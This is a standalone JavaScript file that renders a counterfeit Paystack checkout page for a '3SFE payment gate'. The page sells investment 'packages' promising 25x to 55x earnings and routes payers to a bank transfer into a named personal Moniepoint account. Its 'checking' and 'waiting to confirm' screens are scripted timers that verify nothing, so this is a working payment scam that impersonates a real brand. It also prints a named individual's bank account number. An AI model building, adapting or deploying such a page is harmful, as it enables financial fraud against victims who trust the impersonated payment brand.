(function () {
  var root = document.getElementById('root');
  if (!root || root.innerHTML.trim() !== '') return;

  // Inject Tailwind CDN + custom animations if styles aren't loaded
  if (!document.getElementById('paystack-standalone-styles')) {
    var tw = document.createElement('script');
    tw.src = 'https://cdn.tailwindcss.com';
    document.head.appendChild(tw);

    var style = document.createElement('style');
    style.id = 'paystack-standalone-styles';
    style.textContent =
      'body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; background-color: #ffffff; color: #222222; margin: 0; padding: 0; }\n' +
      '@keyframes paystack-PulseSpoke { 0% { opacity: 0.85; } 100% { opacity: 0.15; } }\n' +
      '.paystack-spoke { animation: paystack-PulseSpoke 1s linear infinite; }\n' +
      '@keyframes progress-move { 0% { transform: translateX(-100%); } 50% { transform: translateX(60%); } 100% { transform: translateX(250%); } }\n' +
      '.animate-progress-move { animation: progress-move 2.2s ease-in-out infinite; }';
    document.head.appendChild(style);
  }

  var PACKAGES = [
    { id: 'starter', name: 'Starter', multiplier: '1x earning', amount: 10000 },
    { id: 'bronze', name: 'Bronze', multiplier: '25x earnings', amount: 25000 },
    { id: 'silver', name: 'Silver', multiplier: '35x earnings', amount: 35000 },
    { id: 'gold', name: 'Gold', multiplier: '55x earnings', amount: 55000 },
  ];

  var state = {
    view: 'form',
    firstName: '',
    lastName: '',
    email: '',
    selectedPackageId: 'starter',
    isPackageDropdownOpen: false,
    isPleaseWait: false,
    showDarkOverlaySpinner: false,
    checkoutMethod: null,
    transferStep: 'loading',
    secondsLeft: 29 * 60 + 59,
    copiedField: null,
    showHelpNote: false,
  };

  var timerInterval = null;

  function getSelectedPackage() {
    for (var i = 0; i < PACKAGES.length; i++) {
      if (PACKAGES[i].id === state.selectedPackageId) return PACKAGES[i];
    }
    return PACKAGES[0];
  }

  function formatTimer(totalSecs) {
    var mins = Math.floor(totalSecs / 60);
    var secs = totalSecs % 60;
    return (mins < 10 ? '0' + mins : mins) + ':' + (secs < 10 ? '0' + secs : secs);
  }

  function getSpinnerHTML(size, dark) {
    var rects = '';
    for (var i = 0; i < 12; i++) {
      var rot = i * 30;
      var delay = -(1 - i / 12).toFixed(3);
      rects +=
        '<rect x="46.5" y="8" width="7" height="24" rx="3.5" fill="' +
        (dark ? '#ffffff' : '#6b7280') +
        '" class="paystack-spoke" style="transform-origin: 50px 50px; transform: rotate(' +
        rot +
        'deg); animation-delay: ' +
        delay +
        's" />';
    }
    return (
      '<div class="relative inline-block" style="width:' +
      size +
      'px;height:' +
      size +
      'px"><svg viewBox="0 0 100 100" class="w-full h-full">' +
      rects +
      '</svg></div>'
    );
  }

  function startTransferTimer() {
    if (timerInterval) clearInterval(timerInterval);
    timerInterval = setInterval(function () {
      if (state.view === 'checkout' && state.checkoutMethod === 'transfer' && state.transferStep === 'details') {
        if (state.secondsLeft > 0) {
          state.secondsLeft--;
          var el = document.getElementById('ps-timer-val');
          if (el) el.textContent = formatTimer(state.secondsLeft);
        }
      }
    }, 1000);
  }

  function render() {
    var pkg = getSelectedPackage();
    var formattedAmount = pkg.amount.toLocaleString('en-US');
    var activeEmail = (state.email || '').trim() || 'abdullahi@gmail.com';

    if (state.view === 'form') {
      var dropdownHTML = '';
      if (state.isPackageDropdownOpen) {
        var items = PACKAGES.map(function (p) {
          var isSel = p.id === state.selectedPackageId;
          return (
            '<button type="button" data-pkg="' +
            p.id +
            '" class="w-full px-3.5 py-2.5 text-left flex items-center justify-between border-b border-[#f1f3f5] last:border-b-0 cursor-pointer ' +
            (isSel ? 'bg-[#ebf7fc]/70 font-semibold text-[#111111]' : 'bg-white hover:bg-[#f9fafb] text-[#222222]') +
            '"><div><span class="text-[14.5px] font-medium text-[#111111]">' +
            p.name +
            '</span><span class="text-[13px] text-[#5c6672] ml-1.5">(' +
            p.multiplier +
            ')</span></div><span class="text-[14px] font-semibold text-[#3bb75e] tabular-nums">NGN ' +
            p.amount.toLocaleString('en-US') +
            '</span></button>'
          );
        }).join('');
        dropdownHTML =
          '<div class="absolute left-0 right-0 top-full mt-1 bg-white border border-[#d1d5db] rounded-[4px] shadow-[0_6px_20px_rgba(0,0,0,0.08)] z-30 overflow-hidden">' +
          items +
          '</div>';
      }

      root.innerHTML =
        '<div class="min-h-screen bg-white relative flex flex-col">' +
        '<header class="w-full bg-[#ebf7fc] pt-5 pb-7 px-4 text-center select-none">' +
        '<h1 class="text-[18px] font-bold text-[#222222] tracking-[-0.01em]">3SFE payment gate</h1>' +
        '<p class="text-[12px] text-[#5c6672] uppercase tracking-[0.06em] mt-2.5 font-normal">BY G GY</p>' +
        '</header>' +
        '<main class="w-full max-w-[440px] mx-auto px-6 pt-9 pb-14 flex-1 relative">' +
        '<form id="ps-pay-form" class="space-y-4">' +
        '<div><label class="block text-[15px] font-medium text-[#111111] mb-2">First name</label>' +
        '<input id="ps-fn" type="text" placeholder="First name" value="' +
        state.firstName.replace(/"/g, '&quot;') +
        '" class="w-full rounded-[4px] px-3.5 py-2.5 text-[15.5px] text-[#222] placeholder-[#9ca3af] outline-none border border-[#d1d5db] focus:border-[#2596ff]" /></div>' +
        '<div><label class="block text-[15px] font-medium text-[#111111] mb-2">Last name</label>' +
        '<input id="ps-ln" type="text" placeholder="Last name" value="' +
        state.lastName.replace(/"/g, '&quot;') +
        '" class="w-full rounded-[4px] px-3.5 py-2.5 text-[15.5px] text-[#222] placeholder-[#9ca3af] outline-none border border-[#d1d5db] focus:border-[#2596ff]" /></div>' +
        '<div><label class="block text-[15px] font-medium text-[#111111] mb-2">Email address</label>' +
        '<input id="ps-em" type="email" placeholder="Email address" value="' +
        state.email.replace(/"/g, '&quot;') +
        '" class="w-full rounded-[4px] px-3.5 py-2.5 text-[15.5px] text-[#222] placeholder-[#9ca3af] outline-none border border-[#d1d5db] focus:border-[#2596ff]" /></div>' +
        '<div class="relative"><label class="block text-[15px] font-medium text-[#111111] mb-2">Choose a package</label>' +
        '<button id="ps-pkg-btn" type="button" class="w-full rounded-[4px] border border-[#d1d5db] bg-white px-3.5 py-2.5 text-left flex items-center justify-between cursor-pointer">' +
        '<div class="flex items-center gap-2 min-w-0"><span class="text-[14.5px] font-medium text-[#222222] truncate">' +
        pkg.name +
        ' (' +
        pkg.multiplier +
        ')</span><span class="text-[13.5px] text-[#3bb75e] font-semibold tabular-nums shrink-0">— NGN ' +
        formattedAmount +
        '</span></div><span class="text-[#6b7280] text-xs">▼</span></button>' +
        dropdownHTML +
        '</div>' +
        '<div class="pt-5 text-center"><span class="text-[12.5px] text-[#4a5568]">🔒 Secured by <strong class="font-extrabold text-[#0f172a]">paystack</strong></span></div>' +
        '<div class="pt-6"><button type="submit" class="w-full py-3.5 rounded-[5px] text-white font-medium text-[16px] cursor-pointer ' +
        (state.isPleaseWait ? 'bg-[#6bc985]' : 'bg-[#3bb75e] hover:bg-[#34a453]') +
        '">' +
        (state.isPleaseWait ? 'Please wait...' : 'Pay now') +
        '</button></div>' +
        '</form></main>' +
        (state.showDarkOverlaySpinner
          ? '<div class="fixed inset-0 bg-black/65 z-50 flex items-center justify-center">' +
            getSpinnerHTML(38, true) +
            '</div>'
          : '') +
        '</div>';

      var fnInput = document.getElementById('ps-fn');
      var lnInput = document.getElementById('ps-ln');
      var emInput = document.getElementById('ps-em');
      if (fnInput) fnInput.oninput = function (e) { state.firstName = e.target.value; };
      if (lnInput) lnInput.oninput = function (e) { state.lastName = e.target.value; };
      if (emInput) emInput.oninput = function (e) { state.email = e.target.value; };

      var pkgBtn = document.getElementById('ps-pkg-btn');
      if (pkgBtn) {
        pkgBtn.onclick = function () {
          state.isPackageDropdownOpen = !state.isPackageDropdownOpen;
          render();
        };
      }

      var pkgOptions = root.querySelectorAll('[data-pkg]');
      pkgOptions.forEach(function (btn) {
        btn.onclick = function () {
          state.selectedPackageId = btn.getAttribute('data-pkg');
          state.isPackageDropdownOpen = false;
          render();
        };
      });

      var form = document.getElementById('ps-pay-form');
      if (form) {
        form.onsubmit = function (e) {
          e.preventDefault();
          state.isPleaseWait = true;
          render();
          setTimeout(function () {
            state.showDarkOverlaySpinner = true;
            render();
          }, 450);
          setTimeout(function () {
            state.isPleaseWait = false;
            state.showDarkOverlaySpinner = false;
            state.checkoutMethod = null;
            state.view = 'checkout';
            render();
          }, 1250);
        };
      }
      return;
    }

    // Checkout view
    if (state.checkoutMethod === null) {
      root.innerHTML =
        '<div class="min-h-screen bg-white flex flex-col items-center"><div class="w-full max-w-[440px] min-h-screen bg-white flex flex-col">' +
        '<div class="px-5 pt-4 pb-5"><p class="text-[11.5px] font-bold text-[#3bb75e] uppercase">PAYSTACK CHECKOUT</p>' +
        '<h2 class="text-[15.5px] text-[#222222] font-normal mt-1">Use one of the payment methods below to pay NGN ' +
        formattedAmount +
        ' to G gy</h2></div>' +
        '<div class="border-t border-[#efefef]">' +
        '<div class="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 opacity-45 cursor-not-allowed"><span class="bg-[#9ca3af] text-white text-[9px] font-medium px-1.5 py-[2px] rounded-[3px] uppercase mr-2.5">NEW</span><span class="text-[15px] text-[#9ca3af]">Pay with Zap</span></div>' +
        '<div class="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 opacity-45 cursor-not-allowed"><span class="text-[15px] text-[#9ca3af]">Pay with Vault</span></div>' +
        '<div class="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 opacity-45 cursor-not-allowed"><span class="text-[15px] text-[#9ca3af]">Pay with Card</span></div>' +
        '<button id="ps-choose-transfer" type="button" class="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-white hover:bg-[#f9fafb] text-left cursor-pointer"><span class="text-[15px] font-bold text-[#111111]">Pay with Transfer</span></button>' +
        '<div class="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 opacity-45 cursor-not-allowed"><span class="text-[15px] text-[#9ca3af]">Pay with Bank</span></div>' +
        '<div class="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 opacity-45 cursor-not-allowed"><span class="text-[15px] text-[#9ca3af]">Pay with USSD</span></div>' +
        '<div class="w-full flex items-center px-5 py-4 border-b border-[#efefef] bg-[#fafafa]/60 opacity-45 cursor-not-allowed"><span class="text-[15px] text-[#9ca3af]">Pay with OPay</span></div>' +
        '</div>' +
        '<div class="mt-14 pb-10 flex flex-col items-center"><button id="ps-cancel-btn" type="button" class="border border-[#dcdfe6] rounded-[4px] px-4 py-2 text-[13px] text-[#4a5568] bg-white cursor-pointer">× Cancel Payment</button>' +
        '<div class="mt-6 text-[12.5px] text-[#4a5568]">🔒 Secured by <strong class="font-extrabold text-[#0f172a]">paystack</strong></div></div>' +
        '</div></div>';

      var trBtn = document.getElementById('ps-choose-transfer');
      if (trBtn) {
        trBtn.onclick = function () {
          state.checkoutMethod = 'transfer';
          state.transferStep = 'loading';
          state.secondsLeft = 29 * 60 + 59;
          render();
          setTimeout(function () {
            state.transferStep = 'details';
            render();
            startTransferTimer();
          }, 650);
        };
      }
      var cancelBtn = document.getElementById('ps-cancel-btn');
      if (cancelBtn) {
        cancelBtn.onclick = function () {
          state.view = 'form';
          render();
        };
      }
      return;
    }

    // Transfer view
    var bodyHTML = '';
    if (state.transferStep === 'loading') {
      bodyHTML = '<div class="py-24 flex items-center justify-center">' + getSpinnerHTML(34, false) + '</div>';
    } else if (state.transferStep === 'details') {
      bodyHTML =
        '<div class="pt-5 pb-6">' +
        '<h3 class="text-center text-[15.5px] font-semibold text-[#222222] px-8 mb-4">Transfer NGN ' +
        formattedAmount +
        ' to Abdullahi Umar</h3>' +
        '<div class="mx-5 bg-[#f8f9fa] rounded-[5px] px-4 py-3.5 border border-[#f0f1f3] space-y-3.5">' +
        '<div><p class="text-[10px] text-[#777777] uppercase font-medium">ACCOUNT NAME</p><p class="text-[14.5px] text-[#222222] font-medium mt-0.5">Abdullahi Umar</p></div>' +
        '<div><p class="text-[10px] text-[#777777] uppercase font-medium">BANK NAME</p><p class="text-[14.5px] text-[#222222] font-medium mt-0.5">Moniepoint MFB</p></div>' +
        '<div class="flex items-center justify-between"><div><p class="text-[10px] text-[#777777] uppercase font-medium">ACCOUNT NUMBER</p><p class="text-[16px] text-[#222222] font-medium mt-0.5">6725375556</p></div></div>' +
        '<div class="flex items-center justify-between"><div><p class="text-[10px] text-[#777777] uppercase font-medium">AMOUNT</p><p class="text-[14.5px] text-[#222222] font-medium mt-0.5">NGN ' +
        formattedAmount +
        '</p></div></div>' +
        '</div>' +
        '<div class="mx-5 my-5 border-t border-dashed border-[#dcdcdc]"></div>' +
        '<p class="px-7 text-center text-[12.5px] text-[#555555]">Search for Moniepoint MFB in your bank app. This account is for this transaction only and expires in <span id="ps-timer-val" class="text-[#3bb75e] font-semibold">' +
        formatTimer(state.secondsLeft) +
        '</span></p>' +
        '<div class="px-5 mt-5"><button id="ps-sent-btn" type="button" class="w-full py-3 border border-[#dcdcdc] rounded-[4px] bg-white text-[#222222] text-[13.5px] font-medium cursor-pointer">I\'ve sent the money</button></div>' +
        '</div>';
    } else if (state.transferStep === 'checking') {
      bodyHTML =
        '<div class="py-20 flex flex-col items-center justify-center">' +
        getSpinnerHTML(34, false) +
        '<p class="text-[13.5px] text-[#333333] mt-3.5">Checking transaction status</p></div>';
    } else if (state.transferStep === 'waiting') {
      bodyHTML =
        '<div class="pt-7 pb-6 px-5">' +
        '<h3 class="text-center text-[14.5px] font-medium text-[#222222]">We\'re waiting to confirm your transfer.<br/>This can take a few minutes</h3>' +
        '<div class="mt-7 mb-7 px-4 flex items-start justify-between">' +
        '<div class="flex flex-col items-center"><div class="w-7 h-7 rounded-full bg-[#3bb75e] text-white flex items-center justify-center">✓</div><span class="text-[11.5px] text-[#555555] mt-2">Sent</span></div>' +
        '<div class="flex-1 mx-2.5 mt-2.5 h-2.5 rounded-full bg-[#f0f0f0] overflow-hidden relative p-[1.5px]"><div class="w-2/5 h-full rounded-full bg-[#3bb75e]/60 animate-progress-move"></div></div>' +
        '<div class="flex flex-col items-center"><div class="w-7 h-7 rounded-full border-[1.5px] border-dashed border-[#cccccc]"></div><span class="text-[11.5px] text-[#555555] mt-2">Received</span></div>' +
        '</div>' +
        '<button id="ps-help-btn" type="button" class="w-full py-3 border border-[#dcdcdc] rounded-[4px] bg-white text-[#222222] text-[13.5px] font-medium cursor-pointer">Get help</button>' +
        (state.showHelpNote
          ? '<div class="mt-3 p-3 rounded-[4px] bg-[#f8f9fa] border border-[#e5e7eb] text-[12px] text-[#555555] text-center">Transfers are typically confirmed within a few minutes. If your bank has debited you, please wait while we verify your transfer to Moniepoint MFB (6725375556).</div>'
          : '') +
        '<div class="mt-4 text-center"><button id="ps-show-acct" type="button" class="text-[12.5px] text-[#777777] cursor-pointer">Show account number</button></div>' +
        '</div>';
    }

    root.innerHTML =
      '<div class="min-h-screen bg-white flex flex-col items-center"><div class="w-full max-w-[440px] min-h-screen bg-white flex flex-col">' +
      '<div class="bg-[#f4f5f7] px-5 py-3 flex items-center gap-2.5 border-b border-[#ebebeb]"><span class="text-[13.5px] font-medium text-[#222222]">Pay with Transfer</span></div>' +
      '<div class="px-5 py-3.5 flex items-center justify-between border-b border-[#efefef] bg-white"><span class="font-bold text-[#00C3F7]">≡</span><div class="text-right"><p class="text-[12.5px] text-[#666666]">' +
      activeEmail +
      '</p><p class="text-[13.5px] text-[#444444]">Pay <span class="font-bold text-[#3bb75e]">NGN ' +
      formattedAmount +
      '</span></p></div></div>' +
      bodyHTML +
      '<div class="border-t border-[#efefef] pt-5 pb-10 bg-white"><div class="flex items-center justify-center gap-3 px-4">' +
      '<button id="ps-change-method" type="button" class="border border-[#dcdfe6] rounded-[4px] px-3.5 py-2 text-[12.5px] text-[#4a5568] bg-white cursor-pointer">⇄ Change Payment Method</button>' +
      '<button id="ps-cancel-2" type="button" class="border border-[#dcdfe6] rounded-[4px] px-3.5 py-2 text-[12.5px] text-[#4a5568] bg-white cursor-pointer">× Cancel Payment</button>' +
      '</div><div class="mt-6 text-center text-[12.5px] text-[#4a5568]">🔒 Secured by <strong class="font-extrabold text-[#0f172a]">paystack</strong></div></div>' +
      '</div></div>';

    var sentBtn = document.getElementById('ps-sent-btn');
    if (sentBtn) {
      sentBtn.onclick = function () {
        state.transferStep = 'checking';
        render();
        setTimeout(function () {
          state.transferStep = 'waiting';
          render();
        }, 3400);
      };
    }

    var helpBtn = document.getElementById('ps-help-btn');
    if (helpBtn) {
      helpBtn.onclick = function () {
        state.showHelpNote = !state.showHelpNote;
        render();
      };
    }

    var showAcctBtn = document.getElementById('ps-show-acct');
    if (showAcctBtn) {
      showAcctBtn.onclick = function () {
        state.transferStep = 'details';
        render();
      };
    }

    var changeBtn = document.getElementById('ps-change-method');
    if (changeBtn) {
      changeBtn.onclick = function () {
        state.checkoutMethod = null;
        render();
      };
    }

    var cancel2Btn = document.getElementById('ps-cancel-2');
    if (cancel2Btn) {
      cancel2Btn.onclick = function () {
        state.checkoutMethod = null;
        state.view = 'form';
        render();
      };
    }
  }

  render();
})();
